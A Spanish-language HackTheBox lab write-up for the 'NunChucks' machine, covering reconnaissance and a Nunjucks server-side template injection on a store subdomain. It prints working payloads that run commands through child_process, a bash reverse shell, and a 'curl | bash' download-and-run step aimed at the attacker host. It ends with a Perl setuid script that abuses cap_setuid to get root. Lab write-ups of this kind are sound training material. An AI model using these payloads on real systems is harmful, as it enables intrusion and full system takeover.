---
title: NunChucks Writeup - HackTheBox
date: 2024-08-14
categories: [WriteUps, HackTheBox]
tags: [Linux, Easy, HackTheBox]
img_path: /assets/img/htb/nunchucks/
image: /assets/img/htb/nunchucks/nunchucks.png
---

Explotamos una vulnerabilidad SSTI en un subdominio para ejecutar comandos de forma remota y obtener una Reverse Shell. Luego, identificamos el binario `/usr/bin/perl` con la capacidad `cap_setuid+ep`, lo que nos permitió escalar privilegios a root mediante la creación de un script Perl, logrando así acceso completo al sistema.

## Reconocimiento
---
Realizamos un escaneo de puertos en la máquina objetivo utilizando `nmap` para identificar los servicios en ejecución.

```bash
nmap -p- --open -sS -Pn -n --min-rate 5000 -vvv 10.10.11.122 -oG allPorts
_______________________________________________________________________
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63
```
---
Identificamos tres puertos abiertos: **22 (SSH)**, **80 (HTTP)** y **443 (HTTPS)**. A continuación, realizamos un escaneo más detallado para identificar las versiones de los servicios y posibles vulnerabilidades.

```bash
nmap -sCV -p22,80 10.10.11.122 -oN targeted 
_______________________________________________________________________
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA)
|   256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 (ECDSA)
|_  256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://nunchucks.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK
| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
| Not valid before: 2021-08-30T15:42:24
|_Not valid after:  2031-08-28T15:42:24
|_http-title: Nunchucks - Landing Page
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
---
El resultado de `nmap` nos indica que el puerto 80, donde corre el servicio HTTP, redirecciona a `https://nunchucks.htb/`. Para acceder correctamente al sitio web desde nuestro navegador, agregamos la IP de la máquina junto con el dominio a nuestro archivo `/etc/hosts`.

```bash
echo "10.10.11.122\tnunchucks.htb" | tee -a /etc/hosts
```
## Enumeración
---
Accedemos al sitio `https://nunchucks.htb/` desde el navegador y exploramos todas las páginas y secciones disponibles. Inicialmente, no encontramos nada relevante. Sin embargo, notamos que hay una sección de "Sign Up", lo cual podría ser interesante.

![nunchucks-1](/assets/img/htb/nunchucks/nunchucks-1.png)

---
Intentamos registrarnos en la página, pero recibimos un mensaje de error. También intentamos iniciar sesión con un correo que encontramos, pero nuevamente recibimos un error.

![nunchucks-2](/assets/img/htb/nunchucks/nunchucks-2.png)

![nunchucks-3](/assets/img/htb/nunchucks/nunchucks-3.png)

---
Dado que el sitio principal no parece ofrecer puntos de ataque obvios, procedemos a realizar un descubrimiento de subdominios utilizando `wfuzz`. Este comando nos permitirá identificar posibles subdominios activos en el dominio `nunchucks.htb`.

```bash
wfuzz -c --hc 404 -t 200 -u https://nunchucks.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.nunchucks.htb" --hl 546
_______________________________________________________________________
=====================================================================
ID           Response   Lines    Word       Chars       Payload      
=====================================================================
000000081:   200        101 L    259 W      4028 Ch     "store"    
```
---
El escaneo revela un subdominio llamado `store.nunchucks.htb`. Actualizamos nuevamente el archivo `/etc/hosts` para incluir este subdominio.

```bash
sed -i '$ s/$/ store.nunchucks.htb/' /etc/hosts
```
---
Accedemos al subdominio `https://store.nunchucks.htb/` y nos encontramos con una página que permite registrar correos electrónicos para recibir actualizaciones del sitio. Probamos ingresando un correo de prueba en el formulario y observamos que la entrada se refleja en el resultado. Este comportamiento sugiere que el sitio podría ser vulnerable a inyección de código, como Server-Side Template Injection (SSTI). 

![nunchucks-4](/assets/img/htb/nunchucks/nunchucks-4.png)

## Explotación
---
Para confirmar la vulnerabilidad, intentamos ingresar una expresión sencilla de SSTI, como `{\{7*7}\}`. Si el sitio es vulnerable, esta entrada debería devolver el resultado de la operación, en este caso `49`.

![nunchucks-5](/assets/img/htb/nunchucks/nunchucks-5.png)

---
El sitio devuelve el resultado esperado, confirmando que es vulnerable a SSTI. Al analizar la página con Wappalyzer, observamos que el sitio está utilizando Node.js.

![nunchucks-6](/assets/img/htb/nunchucks/nunchucks-6.png)

---
El nombre de la máquina es **NunChucks**, lo que sugiere una posible relación con el motor de plantillas Nunjucks, inspirado en Jinja2. Buscamos payloads de SSTI para Node.js y Nunjucks, utilizando esta [Guía de vulnerabilidad](https://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine).

![nunchucks-7](/assets/img/htb/nunchucks/nunchucks-7.png)

---
Interceptamos la petición con Burp Suite y modificamos el payload para ejecutar un comando en la máquina víctima. Utilizamos el siguiente payload para ejecutar `tail /etc/passwd`.

```bash
\{\{range.constructor(\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\")()\}\}
```

![nunchucks-8](/assets/img/htb/nunchucks/nunchucks-8.png)

---
El payload funciona, y obtenemos el contenido del archivo `/etc/passwd`, lo que nos confirma que podemos ejecutar comandos en la máquina víctima. Procedemos a utilizar esta vulnerabilidad para obtener una reverse shell. Creamos un archivo `index.html` que contiene un script bash para establecer una conexión inversa.

```bash
echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.16.3/443 0>&1' > index.html
```
---
Iniciamos un servidor HTTP en nuestro equipo atacante para servir este archivo.

```bash
python3 -m http.server 80
_______________________________________________________________________
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
---
Nos preparamos para recibir la conexión inversa por el puerto 443 utilizando `netcat`.

```bash
nc -lvnp 443
_______________________________________________________________________
listening on [any] 443 ...
```
---
Seguido de esto, desde Burp Suite, enviamos un comando `curl` a la máquina víctima a través de la inyección SSTI para descargar y ejecutar nuestra reverse shell.

```bash
\{\{range.constructor(\"return global.process.mainModule.require('child_process').execSync('curl 10.10.16.3 | bash')\")()\}\}
```

![nunchucks-9](/assets/img/htb/nunchucks/nunchucks-9.png)

---
La conexión se establece con éxito, y ganamos acceso a la máquina como el usuario `david`.

```bash
nc -lvnp 443
listening on [any] 443 ...
_______________________________________________________________________
connect to [10.10.16.3] from nunchucks.htb [10.10.11.122] 35982
david@nunchucks:/var/www/store.nunchucks$ 
```
---
Una vez dentro de la máquina, estabilizamos la TTY para trabajar cómodamente.

```bash
script /dev/null -c bash
# Presionamos "Control + Z"
stty raw -echo; fg
reset xterm
export TERM=xterm SHELL=bash
stty rows 25 columns 127
```
## Escalada de Privilegios
---
Leemos la flag de `user.txt` que se encuentra en el directorio home de `david`.

```bash
david@nunchucks:~$ cat /home/david/ user.txt
_______________________________________________________________________
9ee68f3e51ab88******************
```
---
Listamos los binarios con capacidades especiales que podrían permitirnos escalar privilegios.

```bash
getcap -r / 2>/dev/null
_______________________________________________________________________
/usr/bin/perl = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```
---
La capacidad `cap_setuid+ep` en el binario `/usr/bin/perl` nos permite cambiar el UID del proceso, lo que significa que podríamos ejecutar comandos como si fuéramos el usuario `root`.

```bash
david@nunchucks:~$ ls -la /usr/bin/perl
_______________________________________________________________________
-rwxr-xr-x 1 root root 3478464 Oct 19  2020 /usr/bin/perl
```
---
Listando los permisos confirmamos que el binario `/usr/bin/perl` es propiedad de `root`. Creamos un script en `perl` que cambie el UID a 0 (root) y nos proporcione una shell con privilegios de root.

```bash
echo -ne '#!/bin/perl \nuse POSIX qw(setuid); \nPOSIX::setuid(0); \nexec "/bin/bash";' > run.pl
```
---
Le damos permisos de ejecución al script. Luego, ejecutamos el script para obtener una shell como `root`.

```bash
david@nunchucks:~$ chmod +x run.pl
david@nunchucks:~$ ./run.pl
_______________________________________________________________________
root@nunchucks:~#
```
---
Finalmente, leemos la flag de `root` que se encuentra en el directorio `/root`.

```bash
root@nunchucks:~# cat /root/root.txt
_______________________________________________________________________
4cb470eb91ed1c******************
```